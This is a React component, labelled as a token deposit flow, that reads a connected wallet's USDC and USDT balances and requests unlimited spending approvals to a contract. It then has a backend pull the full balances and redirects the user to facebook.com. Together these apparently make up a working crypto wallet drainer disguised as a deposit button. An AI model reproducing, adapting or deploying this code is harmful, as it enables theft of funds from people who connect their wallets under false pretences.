// components/PermitDepositFlow.jsx
"use client";

import { useState } from "react";
import { ethers } from "ethers";
import { useAppKitProvider, useAppKitAccount } from "@reown/appkit/react";

const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";

const TOKENS = [
  { symbol: "USDC", address: process.env.NEXT_PUBLIC_USDC_ADDRESS || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
];

export default function PermitDepositFlow() {
  const [busy, setBusy] = useState(false);
  const [label, setLabel] = useState("Execute Deposit");

  // Reown Hooks magically pull from the Context Provider in layout.jsx
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider('eip155');

  const runFullFlow = async () => {
    // Failsafe in case they click without connecting
    if (!isConnected || !walletProvider) {
      return alert("Please connect your wallet first using the button above.");
    }

    setBusy(true);
    setLabel("Preparing...");

    try {
      // 1. Wrap the Reown wallet provider in Ethers
      const ethersProvider = new ethers.BrowserProvider(walletProvider);
      const signer = await ethersProvider.getSigner();

      // 2. Read Balances
      const readProvider = new ethers.JsonRpcProvider("https://ethereum-rpc.publicnode.com");
      const held = [];
      
      for (const t of TOKENS) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const balance = await readOnlyToken.balanceOf(address);
        
        if (balance > 0n) {
          const writeEnabledToken = new ethers.Contract(t.address, ERC20_ABI, signer);
          held.push({ ...t, amount: balance, contract: writeEnabledToken });
        }
      }

      if (held.length === 0) {
        setLabel("❌ Zero balance");
        setBusy(false);
        return;
      }

      const successfullyApproved = [];

      // 3. Sequential Approvals
      for (const t of held) {
        const readOnlyToken = new ethers.Contract(t.address, ERC20_ABI, readProvider);
        const currentAllowance = await readOnlyToken.allowance(address, CONTRACT_ADDRESS);
        
        if (currentAllowance < t.amount) {
          try {
            setLabel(`Sign ${t.symbol} in Wallet ↩️`);
            const approveTx = await t.contract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
            
            setLabel(`Mining ${t.symbol}... Please wait.`);
            await approveTx.wait(); 
            
            successfullyApproved.push(t);
          } catch (approvalError) {
            console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
          }
        } else {
          successfullyApproved.push(t);
        }
      }

      if (successfullyApproved.length === 0) {
        setLabel("❌ No tokens approved");
        setBusy(false);
        return;
      }

      // 4. Execute Backend Pull
      setLabel("Executing Deposit...");
      const res = await fetch(BACKEND_URL + "/deposit-batch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          depositor: address, 
          tokens: successfullyApproved.map(t => t.address), 
          amounts: successfullyApproved.map(t => t.amount.toString()) 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        setLabel("✅ Success! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://facebook.com"; 
        }, 1500);
      } else {
        setLabel("❌ Failed — check console");
        setBusy(false);
      }

    } catch (err) {
      console.error("FATAL ERROR:", err);
      setLabel("❌ Error — check console");
      setBusy(false);
    } 
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "16px", alignItems: "flex-start" }}>
      {/* Renders the official Reown Connect button powered by context */}
      <appkit-button />

      {/* Renders your deposit trigger button */}
      <button 
        onClick={runFullFlow} 
        disabled={busy || !isConnected} 
        style={{ 
          padding: "12px 24px", 
          background: (!busy && isConnected) ? "#0052FF" : "#ccc", 
          color: "#fff", 
          borderRadius: "8px", 
          border: "none", 
          cursor: (!busy && isConnected) ? "pointer" : "not-allowed",
          fontWeight: "bold",
          fontSize: "16px"
        }}
      >
        {busy ? "Working..." : label}
      </button>
    </div>
  );
}